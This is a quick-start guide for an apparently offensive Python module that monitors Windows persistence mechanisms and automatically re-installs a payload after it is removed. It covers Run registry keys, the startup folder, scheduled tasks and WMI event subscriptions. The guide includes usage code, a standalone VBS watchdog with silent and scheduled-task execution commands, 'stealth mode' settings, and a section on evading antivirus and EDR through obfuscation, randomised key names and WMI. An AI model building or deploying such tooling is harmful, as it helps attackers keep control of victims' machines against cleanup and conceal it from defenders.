# Payload Watchdog Timer - Quick Start Guide

## What Is It?

A watchdog timer that monitors persistence mechanisms and automatically resurrects payloads if they are removed or disabled. Think of it as a "bring back to life" system for your payload.

## In 30 Seconds

```python
from payload_watchdog_timer import create_watchdog_timer
import time

# Create watchdog
watchdog = create_watchdog_timer("cmd.exe /c whoami")

# Start monitoring
watchdog.start()

# Let it run
time.sleep(300)  # 5 minutes

# Stop monitoring
watchdog.stop()
```

Done! Your payload is now protected.

## What Does It Do?

### Monitoring
- Checks persistence every 30 seconds (configurable)
- Monitors 5 different persistence methods
- Detects if any method was removed

### Resurrection
- If removal detected, automatically restores it
- Supports up to 10 restoration attempts (configurable)
- Waits 5 seconds between attempts (configurable)

### Reporting
- Tracks number of checks performed
- Records removals detected
- Counts successful resurrections
- Logs failures for debugging

## Installation

```python
from payload_watchdog_timer import create_watchdog_timer
```

That's it! The module is self-contained.

## Basic Examples

### Example 1: Default Monitoring
```python
watchdog = create_watchdog_timer("calc.exe")
watchdog.start()
# ... runs in background ...
watchdog.stop()
```

### Example 2: Faster Checks
```python
watchdog = create_watchdog_timer(
    "calc.exe",
    check_interval=10  # Check every 10 seconds
)
watchdog.start()
```

### Example 3: With Callbacks
```python
def on_detection(data):
    print(f"Removal detected: {data['removed_methods']}")

watchdog = create_watchdog_timer("calc.exe")
watchdog.register_callback('on_check', on_detection)
watchdog.start()
```

### Example 4: Get Status
```python
status = watchdog.get_status()
print(f"Checks: {status['total_checks']}")
print(f"Detections: {status['detections']}")
print(f"Resurrections: {status['resurrections']}")
```

### Example 5: VBS Standalone Script
```python
watchdog = create_watchdog_timer("cmd.exe /c whoami")
vbs_code = watchdog.get_vbs_watchdog_code()

# Save to file
with open("watchdog.vbs", "w") as f:
    f.write(vbs_code)

# Execute with: cscript watchdog.vbs
```

## Configuration Options

### Check Interval
How often to check (seconds)
```python
watchdog = create_watchdog_timer(
    "calc.exe",
    check_interval=30  # Every 30 seconds (default)
)
```

**Recommended values:**
- 10 seconds: Very aggressive, high overhead
- 30 seconds: Balanced (default)
- 60 seconds: Stealth mode, low overhead

### Max Restarts
Maximum number of resurrection attempts
```python
watchdog = create_watchdog_timer(
    "calc.exe",
    max_restarts=10  # Try up to 10 times (default)
)
```

### Restart Delay
Wait before each resurrection attempt (seconds)
```python
watchdog = create_watchdog_timer(
    "calc.exe",
    restart_delay=5  # Wait 5 seconds before restore (default)
)
```

### Persistence Methods
Which methods to monitor
```python
watchdog = create_watchdog_timer(
    "calc.exe",
    persistence_methods=[
        "registry_hkcu",
        "startup_folder",
        "scheduled_task",
    ]
)
```

**Available methods:**
- `registry_hkcu` - User registry (fast, visible)
- `registry_hklm` - System registry (requires admin)
- `startup_folder` - Startup folder (universal)
- `scheduled_task` - Task scheduler (stealthy)
- `wmi_event` - WMI events (very stealthy)

## What Methods Does It Monitor?

### Registry HKCU
- **What**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **How**: Searches for your payload command
- **Restoration**: Writes new registry entry with random name

### Registry HKLM
- **What**: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- **How**: Searches for your payload command
- **Restoration**: Writes new registry entry with random name
- **Note**: Requires administrator

### Startup Folder
- **What**: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- **How**: Looks for VBS/BAT files containing payload
- **Restoration**: Creates new VBS file with random name

### Scheduled Task
- **What**: Windows Task Scheduler tasks
- **How**: Queries `schtasks` for matching task
- **Restoration**: Creates new scheduled task with onlogon trigger
- **Note**: Vista and later only

### WMI Event
- **What**: WMI event subscriptions
- **How**: Checks WMI service responsiveness
- **Restoration**: Creates new WMI event subscription via PowerShell

## Events & Callbacks

### Available Events

**on_start** - Watchdog started
```python
def on_start():
    print("Watchdog is now running")

watchdog.register_callback('on_start', on_start)
```

**on_check** - Check performed (triggered multiple times)
```python
def on_check(data):
    print(f"Check #{data['stats']['total_checks']}")
    if data['removed_methods']:
        print(f"Removed: {data['removed_methods']}")

watchdog.register_callback('on_check', on_check)
```

**on_restart** - Payload resurrected
```python
def on_restart(data):
    print(f"Attempt {data['restart_count']}: Restored {data['restored_methods']}")

watchdog.register_callback('on_restart', on_restart)
```

**on_failure** - Error occurred
```python
def on_failure(data):
    print(f"Error: {data['error']}")

watchdog.register_callback('on_failure', on_failure)
```

**on_stop** - Watchdog stopped
```python
def on_stop():
    print("Watchdog stopped")

watchdog.register_callback('on_stop', on_stop)
```

**on_threshold_exceeded** - Max restarts exceeded
```python
def on_threshold(data):
    print(f"Max restarts exceeded: {data['restart_count']}/{data['max_restarts']}")

watchdog.register_callback('on_threshold_exceeded', on_threshold)
```

## Getting Status

```python
status = watchdog.get_status()

# Basic info
status['running']           # bool: Is watchdog running?
status['uptime_seconds']    # int: How long has it been running?
status['restart_count']     # int: How many resurrection attempts?

# Statistics
status['total_checks']      # int: How many checks performed?
status['detections']        # int: How many removals detected?
status['resurrections']     # int: How many successful restores?
status['failures']          # int: How many failed restores?

# Configuration
status['payload_command']   # str: The command being monitored
status['check_interval']    # int: Seconds between checks
status['max_restarts']      # int: Maximum restart attempts

# Persistence state
status['persistence_state'] # dict: State of each monitored method
```

## Common Use Cases

### Case 1: Protect Against Accidental Removal
```python
watchdog = create_watchdog_timer(
    "cmd.exe /c mycommand",
    check_interval=30,  # Check every 30 seconds
    max_restarts=10     # Restore up to 10 times
)
watchdog.start()
```

### Case 2: Aggressive Red Team Operation
```python
watchdog = create_watchdog_timer(
    "cmd.exe /c mycommand",
    check_interval=10,   # Check every 10 seconds
    max_restarts=20,     # Many restoration attempts
    restart_delay=2,     # Quick restoration
)
watchdog.start()
```

### Case 3: Stealth Monitoring
```python
watchdog = create_watchdog_timer(
    "cmd.exe /c mycommand",
    check_interval=60,   # Check every 60 seconds
    max_restarts=5,      # Limited attempts
    persistence_methods=[
        "registry_hkcu",
        "startup_folder"
    ]
)
watchdog.start()
```

### Case 4: Production with Logging
```python
import logging
logging.basicConfig(level=logging.INFO)

watchdog = create_watchdog_timer("cmd.exe /c mycommand")

def log_check(data):
    logging.info(f"Check {data['stats']['total_checks']}: "
                 f"{len(data['removed_methods'])} removals")

watchdog.register_callback('on_check', log_check)
watchdog.start()
```

## Troubleshooting

### "Watchdog not detecting removals"
1. Ensure persistence method is correctly installed
2. Verify payload command matches exactly
3. Decrease check_interval (e.g., from 30 to 10)
4. Enable debug logging

### "Resurrection keeps failing"
1. Check administrator privileges (for HKLM, scheduled tasks)
2. Verify payload command is valid
3. Check available disk space
4. Review error logs

### "High CPU usage"
1. Increase check_interval (from 30 to 60+)
2. Reduce number of monitored methods
3. Stop watchdog when not needed

### "Thread not starting"
1. Check Python version (requires 3.6+)
2. Verify no exceptions in logs
3. Try increasing verbosity

## Running VBS Watchdog

Generate standalone VBS script that doesn't require Python:

```python
watchdog = create_watchdog_timer("cmd.exe /c whoami")
vbs_code = watchdog.get_vbs_watchdog_code()

# Save to file
with open("C:\\watchdog.vbs", "w") as f:
    f.write(vbs_code)
```

Execute the VBS script:
```batch
REM Direct execution
cscript.exe watchdog.vbs

REM Silent execution
wscript.exe watchdog.vbs

REM Background execution
cscript.exe //B watchdog.vbs

REM Via scheduled task
schtasks /create /tn "Watchdog" /tr "cscript.exe C:\watchdog.vbs" /sc onlogon /f
```

## Integration with Persistence Manager

Use together with `persistence_manager.py`:

```python
from persistence_manager import create_persistent_payload
from payload_watchdog_timer import create_watchdog_timer

# Create persistent payload
payload_result = create_persistent_payload("cmd.exe /c whoami", "multi")

# Create watchdog for same command
watchdog = create_watchdog_timer("cmd.exe /c whoami")
watchdog.start()

# Now you have both persistence AND watchdog protection
```

## Performance

### Typical Resource Usage
- **CPU**: 1-2% per check
- **Memory**: 5-10 MB
- **Threads**: 1 daemon thread
- **Network**: None (local only)

### Check Time
- Registry checks: ~50ms each
- Startup folder check: ~100ms
- Scheduled task check: ~200ms
- Total per iteration: 50-300ms depending on methods

## Best Practices

1. **Test First**: Test in lab environment before deployment
2. **Choose Interval Wisely**: Balance between detection speed and stealth
3. **Monitor Multiple Methods**: Use 3-5 methods for redundancy
4. **Set Realistic Limits**: Don't set max_restarts too high
5. **Log Events**: Use callbacks to log important events
6. **Clean Up**: Call stop() when done to free resources
7. **Verify**: Check status regularly to confirm it's running
8. **Secure Payload**: Obfuscate payload command if possible

## Security Notes

### Visibility
- Registry methods visible in regedit
- Startup files visible in Windows Explorer
- Scheduled tasks visible in Task Scheduler
- WMI events less visible but queryable

### Detection
- Antivirus may detect persistence methods
- EDR may flag repeated resurrections
- WMI events more difficult to detect
- Scheduled tasks have high visibility

### Mitigation
- Use obfuscated payload commands
- Randomize registry key names
- Use stealthy methods (WMI)
- Appropriate check intervals
- Monitor in low-visibility environments

## All Configuration Parameters

```python
watchdog = create_watchdog_timer(
    payload_command: str,           # Command to monitor (REQUIRED)
    check_interval: int = 30,       # Seconds between checks
    max_restarts: int = 10,         # Max resurrection attempts
    restart_delay: int = 5,         # Seconds before restart attempt
    persistence_methods: List[str] = None  # Which methods to monitor
)
```

## API at a Glance

```python
# Create
watchdog = create_watchdog_timer(payload)

# Control
watchdog.start()
watchdog.stop()

# Callbacks
watchdog.register_callback('on_check', callback_func)

# Status
status = watchdog.get_status()

# VBS Export
vbs_code = watchdog.get_vbs_watchdog_code()
```

## Next Steps

1. **Read Full Documentation**
   - `PAYLOAD_WATCHDOG_DOCUMENTATION.md`

2. **Run Examples**
   - `python payload_watchdog_examples.py`

3. **Run Tests**
   - `python test_payload_watchdog.py`

4. **Integration**
   - Use with persistence_manager.py
   - Combine with payload_file_writer.py

## Summary

The Payload Watchdog Timer provides automatic protection of persistence mechanisms through:
- Continuous monitoring of multiple persistence methods
- Automatic resurrection if any method is removed
- Configurable check intervals and restart limits
- Event callbacks for integration
- Standalone VBS script generation
- Complete statistics and status tracking

Start with default settings, adjust based on your needs, and monitor the statistics to ensure protection is working.

---

For detailed information, see `PAYLOAD_WATCHDOG_DOCUMENTATION.md`
